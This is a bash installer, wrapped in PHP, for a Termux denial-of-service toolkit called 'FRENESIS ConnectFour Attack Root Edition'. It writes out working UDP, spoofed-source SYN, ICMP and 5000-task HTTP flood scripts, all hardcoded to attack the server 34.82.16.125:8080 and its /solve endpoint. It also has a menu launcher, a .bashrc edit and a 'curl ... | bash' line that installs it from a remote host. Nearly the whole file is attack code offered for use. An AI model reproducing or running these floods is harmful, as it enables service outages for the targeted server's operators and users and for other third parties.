<?php
// FRENESIS ConnectFour Attack - Root Edition
// curl -sL http://tuysstore.my.id/script/attack-connectfour/setup-root.php | bash

header('Content-Type: text/plain');
echo "╔══════════════════════════════════════╗\n";
echo "║   FRENESIS CONNECTFOUR ATTACK        ║\n";
echo "║   ROOT EDITION - Termux              ║\n";
echo "╚══════════════════════════════════════╝\n";
echo "\n";
echo "[+] Installing ROOT edition...\n";
echo "\n";
?>

#!/bin/bash
# FRENESIS ConnectFour Attack - Root Edition
# curl -sL http://tuysstore.my.id/script/attack-connectfour/setup-root.php | bash

echo "[+] Checking root access..."
if [ "$(whoami)" != "root" ]; then
    echo "[!] ERROR: This script requires ROOT access!"
    echo "[!] Run: su"
    echo "[!] Then run this script again"
    exit 1
fi

echo "[+] Root access confirmed!"
echo "[+] Installing dependencies..."

# Update and install
pkg update -y
pkg install -y python python-pip git clang make
pip install aiohttp scapy

# Create directory
mkdir -p ~/frenesis-root-attack
cd ~/frenesis-root-attack

# Create UDP Flood (Root Only)
cat > udp-flood.py << 'EOF'
#!/usr/bin/env python3
# UDP Flood - Root Only
import socket
import random
import threading
import time

TARGET_IP = "34.82.16.125"
TARGET_PORT = 8080
THREADS = 50  # UDP is connectionless, fewer threads needed

print(f"[+] UDP Flood Attack (ROOT)")
print(f"[+] Target: {TARGET_IP}:{TARGET_PORT}")
print(f"[+] Threads: {THREADS}")
print("[+] Press Ctrl+C to stop")

packets_sent = 0
start_time = time.time()

def udp_attack(thread_id):
    global packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        try:
            # Random data 1KB
            data = bytes([random.randint(0, 255) for _ in range(1024)])
            sock.sendto(data, (TARGET_IP, TARGET_PORT))
            packets_sent += 1
            
            if packets_sent % 1000 == 0:
                elapsed = time.time() - start_time
                pps = packets_sent / elapsed if elapsed > 0 else 0
                print(f"\r[STATS] Packets: {packets_sent:,} | PPS: {pps:,.0f}", end='')
                
        except Exception as e:
            pass

# Start threads
threads = []
for i in range(THREADS):
    t = threading.Thread(target=udp_attack, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

try:
    # Keep main thread alive
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    elapsed = time.time() - start_time
    pps = packets_sent / elapsed if elapsed > 0 else 0
    print(f"\n[+] Stopped | Total packets: {packets_sent:,} | Average PPS: {pps:,.0f}")
EOF

# Create SYN Flood (Root + Scapy)
cat > syn-flood.py << 'EOF'
#!/usr/bin/env python3
# SYN Flood - Requires Scapy and root
import random
import threading
import time
from scapy.all import IP, TCP, send

TARGET_IP = "34.82.16.125"
TARGET_PORT = 8080
THREADS = 20

print(f"[+] SYN Flood Attack (ROOT + Scapy)")
print(f"[+] Target: {TARGET_IP}:{TARGET_PORT}")
print("[+] Filling server SYN backlog...")
print("[+] Press Ctrl+C to stop")

packets_sent = 0
start_time = time.time()

def syn_attack(thread_id):
    global packets_sent
    while True:
        try:
            # Random source IP
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            
            # Create SYN packet
            ip = IP(src=src_ip, dst=TARGET_IP)
            tcp = TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=random.randint(0, 4294967295))
            
            # Send packet
            send(ip/tcp, verbose=0)
            packets_sent += 1
            
            if packets_sent % 500 == 0:
                elapsed = time.time() - start_time
                pps = packets_sent / elapsed if elapsed > 0 else 0
                print(f"\r[STATS] SYN packets: {packets_sent:,} | PPS: {pps:,.0f}", end='')
                
        except Exception:
            pass

# Start threads
threads = []
for i in range(THREADS):
    t = threading.Thread(target=syn_attack, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    elapsed = time.time() - start_time
    pps = packets_sent / elapsed if elapsed > 0 else 0
    print(f"\n[+] Stopped | Total SYN packets: {packets_sent:,}")
EOF

# Create ICMP Flood (Root)
cat > icmp-flood.py << 'EOF'
#!/usr/bin/env python3
# ICMP Flood (Ping Flood)
import subprocess
import threading
import time

TARGET_IP = "34.82.16.125"
THREADS = 10

print(f"[+] ICMP Flood Attack (ROOT)")
print(f"[+] Target: {TARGET_IP}")
print("[+] Sending maximum size ICMP packets...")
print("[+] Press Ctrl+C to stop")

def icmp_attack(thread_id):
    while True:
        try:
            # Send large ICMP packets
            subprocess.run([
                "ping", "-c", "100", "-s", "65500", 
                "-f", TARGET_IP
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# Start threads
threads = []
for i in range(THREADS):
    t = threading.Thread(target=icmp_attack, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
        print(f"\r[STATUS] ICMP flood running... Threads: {THREADS}", end='')
except KeyboardInterrupt:
    print("\n[+] ICMP flood stopped")
EOF

# Create HTTP Flood Enhanced (Root can open more sockets)
cat > http-root.py << 'EOF'
#!/usr/bin/env python3
# HTTP Flood - Root Enhanced
import random, asyncio, aiohttp, time
from aiohttp import ClientTimeout, TCPConnector

TARGET_URL = "http://34.82.16.125:8080/solve"
THREADS = 5000  # Root can handle more!
TIMEOUT = 10

print(f"[+] HTTP Flood - ROOT ENHANCED")
print(f"[+] Threads: {THREADS} (root allows more file descriptors)")
print(f"[+] Target: {TARGET_URL}")

req = ok = err = 0
start = time.time()

async def flood(session, tid):
    global req, ok, err
    while True:
        pos = ''.join(str(random.randint(1,7)) for _ in range(42))
        url = f"{TARGET_URL}?pos={pos}&_={int(time.time()*1000)}"
        try:
            async with session.get(url, timeout=ClientTimeout(total=TIMEOUT)) as r:
                await r.read()
                req += 1
                if 200 <= r.status < 500:
                    ok += 1
                else:
                    err += 1
        except:
            req += 1
            err += 1

async def stats():
    while True:
        await asyncio.sleep(2)
        elapsed = time.time() - start
        rps = req / elapsed if elapsed else 0
        rate = ok / req * 100 if req else 0
        print(f"\r[ROOT] Req:{req:,} OK:{ok:,} ERR:{err:,} RPS:{rps:,.0f} Rate:{rate:.1f}%", end='')

async def main():
    # Root can use higher limits
    connector = TCPConnector(
        limit=0,
        limit_per_host=0,
        force_close=True,
        ssl=False,
        use_dns_cache=False
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [flood(session, i) for i in range(THREADS)]
        tasks.append(stats())
        print("[+] ROOT attack launched!")
        print("[+] Press Ctrl+C to stop\n")
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            elapsed = time.time() - start
            rps = req / elapsed if elapsed else 0
            print(f"\n\n[+] Stopped | Total: {req:,} req | RPS: {rps:,.0f}")

asyncio.run(main())
EOF

# Create attack menu for root
cat > attack-root << 'EOF'
#!/bin/bash
cd ~/frenesis-root-attack
echo ""
echo "╔══════════════════════════════════════╗"
echo "║    FRENESIS ROOT ATTACK MENU         ║"
echo "╠══════════════════════════════════════╣"
echo "║  Target: 34.82.16.125:8080           ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "  ROOT-ONLY ATTACKS:"
echo "  1) UDP Flood      (Fastest, connectionless)"
echo "  2) SYN Flood      (Exhaust server backlog)"
echo "  3) ICMP Flood     (Ping of death)"
echo "  4) HTTP Root      (5000 threads enhanced)"
echo ""
echo "  UTILITIES:"
echo "  5) Stop all attacks"
echo "  6) Test connection"
echo "  7) Install hping3 (advanced)"
echo "  8) Exit"
echo ""
read -p "Choice [1-8]: " c < /dev/tty
c=$(echo "$c" | tr -d '[:space:]\r\n')

case $c in
  1) python udp-flood.py ;;
  2) python syn-flood.py ;;
  3) python icmp-flood.py ;;
  4) python http-root.py ;;
  5) pkill -f python; pkill -f ping; echo "[+] All attacks stopped" ;;
  6) curl -s "http://34.82.16.125:8080/solve?pos=123" -o /dev/null -w "Status: %{http_code}\nTime: %{time_total}s\n" ;;
  7) pkg install -y hping3 && echo "[+] hping3 installed for advanced attacks" ;;
  8) exit 0 ;;
  *) echo "[!] Invalid choice" ;;
esac
EOF

# Make executable
chmod +x udp-flood.py syn-flood.py icmp-flood.py http-root.py attack-root

# Add to PATH
echo 'export PATH="$HOME/frenesis-root-attack:$PATH"' >> ~/.bashrc
export PATH="$HOME/frenesis-root-attack:$PATH"

echo ""
echo "✅ ROOT EDITION INSTALLED!"
echo ""
echo "Available commands:"
echo "  attack-root    - Root attack menu"
echo ""
echo "Root attacks available:"
echo "  1) UDP Flood    - No connection, fastest"
echo "  2) SYN Flood    - Fill server SYN queue"
echo "  3) ICMP Flood   - Large ping packets"
echo "  4) HTTP Root    - 5000 threads enhanced"
echo ""
echo "Usage:"
echo "  su              # Switch to root"
echo "  attack-root     # Start root attacks"
echo ""
echo "⚠️  WARNING: Root attacks are VERY powerful!"
echo "   Use responsibly and only on authorized targets."
echo ""
